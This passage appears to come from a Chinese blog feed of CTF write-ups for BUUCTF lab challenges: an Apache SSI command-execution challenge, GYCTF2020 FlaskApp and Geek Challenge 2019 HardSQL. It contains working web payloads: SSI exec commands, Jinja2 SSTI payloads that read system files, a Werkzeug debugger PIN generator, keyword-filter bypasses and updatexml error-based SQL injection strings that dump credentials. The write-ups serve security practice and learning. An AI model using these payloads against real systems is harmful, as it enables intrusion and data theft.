&lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;<br>            ***<br>***&#39;;<br>            fwrite($shtml,$text);<br>            fclose($shtml);<br>            ***<br>echo &quot;[!] Header  error ...&quot;;<br>        &#125; else &#123;<br>            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;<br>            <br>    &#125;else<br>    &#123;<br>***<br>    &#125;<br>***<br>?&gt;<br></code></pre></td></tr></table></figure><p>映入眼帘的就是hash函数</p><p>注意到登陆代码</p><p><img src="/2021/09/02/2021/ctf/18/image-20210902200408592.png" alt="image-20210902200408592"></p><p>​        解释起来，就是password必须hash加密后要等于6d0bc1，满足后就会输出script弹窗 </p><p>‘Welcome to manage system’</p><p><img src="/2021/09/02/2021/ctf/18/image-20210902200802654.png" alt="image-20210902200802654"></p><p>登录成功后会生成相应的shtml文件</p><p>开始解题</p><p>先得到脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"># -*- coding: utf-8 -*-<br>import hashlib<br>import threading<br>string &#x3D; &#39;0123456789&#39;<br>class BF(threading.Thread):<br>    def __init__(self,left,right):<br>        threading.Thread.__init__(self) #父类的构造方法<br>        self.left &#x3D; left<br>        self.right &#x3D; right<br>    def run(self):<br>        admin &#x3D; &#39;6d0bc1&#39;<br>        for i in range(self.left,self.right):<br>            s &#x3D; hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()<br>            if s[:6] &#x3D;&#x3D; admin:<br>                print i<br>threads &#x3D; []<br>thread_count &#x3D; 5<br>for i in range(thread_count):<br>    threads.append(BF(i*2000000, (i+1)*2000000))<br>for t in threads:<br>    t.start()<br>for t in threads:<br>    t.join()<br><br></code></pre></td></tr></table></figure><p>跑完后：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">\<span class="hljs-meta">#2020666</span><br>\<span class="hljs-meta">#2305004</span><br>\<span class="hljs-meta">#9162671</span><br></code></pre></td></tr></table></figure><p>选择其中一个密码登录</p><p>然后查看网络状态</p><p><img src="/2021/09/02/2021/ctf/18/image-20210902201334561.png" alt="image-20210902201334561"></p><p>用这里的路径访问下</p><p><img src="/2021/09/02/2021/ctf/18/image-20210902201420408.png" alt="image-20210902201420408"></p><p>看wp知道了后面用ssti模板注入</p><p>这里有一个知识点</p><p><strong>Apache SSI 远程命令执行漏洞</strong><br>链接：</p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p><img src="/2021/09/02/2021/ctf/18/image-20211028185301599.png" alt="image-20211028185301599"></p><!--#exec cmd="whoami"--><p><img src="/2021/09/02/2021/ctf/18/image-20210902201644511.png" alt="image-20210902201644511"></p><!--#exec cmd="ls"--><p><img src="/2021/09/02/2021/ctf/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201754915.png" alt="image-20210902201754915"></p><!--#exec cmd="ls ../"-->  #看一下上层目录<p><img src="/2021/09/02/2021/ctf/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201952167.png" alt="image-20210902201952167"></p><p>找到了</p><!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--><p><img src="/2021/09/02/2021/ctf/18/image-20210902202133502.png" alt="image-20210902202133502"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020 FlaskApp</title>
      <link href="/2021/09/01/2021/ctf/17/"/>
      <url>/2021/09/01/2021/ctf/17/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/cbca419ba075">flask框架下的ssti+pin码执行命令 - 简书 (jianshu.com)</a></p><p>[<a href="https://blog.csdn.net/SopRomeo/article/details/105875248">GYCTF2020]FlaskApp_SopRomeo的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/Alexhcf/article/details/108400293">(1条消息) GYCTF2020 FlaskApp_汗的博客-CSDN博客</a></p><p>最近刚学了模板注入，这题就直接顺着flask的payload去</p><p>打payload时要注意输入一整行内容</p><p><img src="/2021/09/01/2021/ctf/17/image-20210901155839298.png" alt="image-20210901155839298"></p><p>试着用简单的payload</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>+<span class="hljs-number">2</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>经过加密解密提交后</p><p><img src="/2021/09/01/2021/ctf/17/image-20210901160005521.png" alt="image-20210901160005521"></p><p>再尝试用system函数</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/09/01/2021/ctf/17/image-20210901160203877.png" alt="image-20210901160203877"></p><p>好家伙，果然被过滤了</p><p>试了几个关键字都不行后，查看提示，在源码处看到</p><p><img src="/2021/09/01/2021/ctf/17/image-20210901160310325.png" alt="image-20210901160310325"></p><p>看到PIN</p><p>果断上网查了文章，发现PIN还挺难得到的</p><p>主要是python脚本不会写。。。</p><p>接下来按照正常解题流程：</p><h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>payload1获取mac地址</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;/sys/class/net/eth0/address&#x27;</span>,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>得到</p><p><img src="/2021/09/01/2021/ctf/17/image-20211028183617395.png" alt="image-20211028183617395"></p><p>进行16进制到10进制的转换<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p><p>或者python代码实现</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">print</span>(int(&#x27;<span class="hljs-number">02</span>:<span class="hljs-number">42</span>:ac:<span class="hljs-number">10</span>:<span class="hljs-number">8</span>a:db&#x27;,<span class="hljs-number">16</span>))<br></code></pre></td></tr></table></figure><p>得到：2485377862363</p><p>接着获取id，读取<code>/proc/self/cgroup</code></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;/proc/self/cgroup&#x27;</span>,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>得到</p><p><img src="/2021/09/01/2021/ctf/17/image-20211028183832593.png" alt="image-20211028183832593"></p><p>即</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">结果 ： <span class="hljs-number">12</span>:pids:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">11</span>:devices:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">10</span>:rdma:/ <span class="hljs-number">9</span>:memory:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">8</span>:blkio:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">7</span>:cpu,cpuacct:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">6</span>:net_cls,net_prio:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">5</span>:hugetlb:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">4</span>:cpuset:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">3</span>:perf_event:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">2</span>:freezer:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">1</span>:name=systemd:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">0</span>::/system.slice/containerd.service<br></code></pre></td></tr></table></figure><p>将得到的机器id和mac地址放进脚本跑pin码</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span>,<span class="hljs-comment">#服务器运行flask所登录的用户名</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment">#modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment">#getattr(app, &quot;\_\_name__&quot;, app.\_\_class__.\_\_name__)</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>,<span class="hljs-comment">#flask库下app.py的绝对路径</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485377862363&#x27;</span>,<span class="hljs-comment">#当前网络的mac地址的十进制数</span><br>    <span class="hljs-string">&#x27;194fc0dd10ec5710c44cc4933a001404389c65e89c26c57b0b654960ee618b38&#x27;</span><span class="hljs-comment">#机器的id</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> isinstance(bit, str):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> len(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br>print(rv)<br></code></pre></td></tr></table></figure><p>记住要在脚本开头加上utf-8句子，不然会报错# encoding: utf-8</p><p><img src="/2021/09/01/2021/ctf/17/image-20211028184228753.png" alt="image-20211028184228753"></p><p><strong>PIN:    562-831-713</strong></p><p>在报错页面选择进入命令行，输入pin</p><p><img src="/2021/09/01/2021/ctf/17/image-20211028184419952.png" alt="image-20211028184419952"></p><p>进入之后在输入以下指令：</p><p>os.popen() 方法用于从一个命令打开一个管道。</p><p>语法格式：</p><p>os.popen(command[, mode[, bufsize]])</p><p><img src="/2021/09/01/2021/ctf/17/image-20211028185034014.png" alt="image-20211028185034014"></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span><br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&quot;ls -l /&quot;</span>).<span class="hljs-built_in">read</span>()<br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&quot;cat /this_is_the_flag.txt&quot;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p><img src="/2021/09/01/2021/ctf/17/image-20211028184721243.png" alt="image-20211028184721243"></p><h4 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h4><p>字符串拼接绕过<br>从 black list大致知道了关键字，另外会将字符转小写，所以没法通过lower方法或者base64、hex一下绕过，但是最常见的是字符串拼接绕过，参考菜鸟教程找到os模块的一些方法<br>先使用listdir方法看看当前目录文件</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#123;% for c in [<span class="hljs-string"></span>].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;__imp&#x27;+&#x27;ort__&#x27;</span>](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></code></pre></td></tr></table></figure><p>加密解密结果</p><p>结果 ： [&#39;bin&#39;, &#39;boot&#39;, &#39;dev&#39;, &#39;etc&#39;, &#39;home&#39;, &#39;lib&#39;, &#39;lib64&#39;, &#39;media&#39;, &#39;mnt&#39;, &#39;opt&#39;, &#39;proc&#39;, &#39;root&#39;, &#39;run&#39;, &#39;sbin&#39;, &#39;srv&#39;, &#39;sys&#39;, &#39;tmp&#39;, &#39;usr&#39;, &#39;var&#39;, &#39;this_is_the_flag.txt&#39;, &#39;.dockerenv&#39;, &#39;app&#39;]</p><p>其中this_is_the_flag.txt有flag字样，那么接下来就是想办法读这个文件，还是采用拼接字符串的方式，然后结合内建函数open，菜鸟教程</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;</span>,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战 2019 HardSQL</title>
      <link href="/2021/08/30/2021/ctf/16/"/>
      <url>/2021/08/30/2021/ctf/16/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00知识点："><a href="#0x00知识点：" class="headerlink" title="0x00知识点："></a>0x00知识点：</h4><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>sql注入中的updatexml()函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">UPDATEXML(XML_document, XPath_string, new_value);<br></code></pre></td></tr></table></figure><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p><p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值</p><p>改变XML_document中符合XPATH_string的值</p><p>例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>​            其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">ERROR </span>1105 (HY000): XPATH syntax error: &#x27;:root@localhost&#x27;<br></code></pre></td></tr></table></figure><p>xpath语法总结：<a href="https://www.jb51.net/article/125607.htm">https://www.jb51.net/article/125607.htm</a></p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ExtractValue(xml_frag, xpath_expr)<br></code></pre></td></tr></table></figure><p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p><p>第一个参数可以传入目标xml文档</p><p>第二个参数是用Xpath路径法表示的查找路径</p><p>例子：</p><p>例如：SELECT ExtractValue(‘<a><b><b></b></b></a>‘, ‘/a/b’); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-e7ea259697eb4cf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/421/format/webp" alt="img"></p><p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-f13351339e441a96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/580/format/webp" alt="img"></p><h4 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h4><p><img src="/2021/08/30/2021/ctf/16/image-20210830091906610.png" alt="image-20210830091906610"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>&#x27;or(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p>爆出库</p><p><img src="/2021/08/30/2021/ctf/16/image-20210830092011080.png" alt="image-20210830092011080"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">table_name</span>)from(<span class="hljs-name">information_schema</span>.tables)where(<span class="hljs-name">table_schema</span>)like(&#x27;geek&#x27;)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/2021/08/30/2021/ctf/16/image-20210830092201589.png" alt="image-20210830092201589"></p><p>爆出表名</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">column_name</span>))from(<span class="hljs-name">information_schema</span>.columns)where(<span class="hljs-name">table_name</span>)like(&#x27;H4rDsq1&#x27;)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/2021/08/30/2021/ctf/16/image-20210830092501514.png" alt="image-20210830092501514"></p><p>爆出列名</p><p>构造payload：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">id</span>,&#x27;~&#x27;,username,&#x27;~&#x27;,password))from(<span class="hljs-name">H4rDsq1</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/2021/08/30/2021/ctf/16/image-20210830092549838.png" alt="image-20210830092549838"></p><p>右边的flag</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">admin&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">right</span>(<span class="hljs-name">password</span>,<span class="hljs-number">35</span>))from(<span class="hljs-name">H4rDsq1</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/2021/08/30/2021/ctf/16/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210830092639064.png" alt="image-20210830092639064"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">补充：<br><br><span class="hljs-number">1</span>：空格被过滤可以使用<span class="hljs-comment">/**/</span>或者()绕过<br><span class="hljs-number">2</span>：=号被过滤可以用like来绕过<br><span class="hljs-number">3</span>：substring与mid被过滤可以用right与left来绕过<br></code></pre></td></tr></table></figure><h4 id="参考博客："><a href="#参考博客：" class="headerlink" 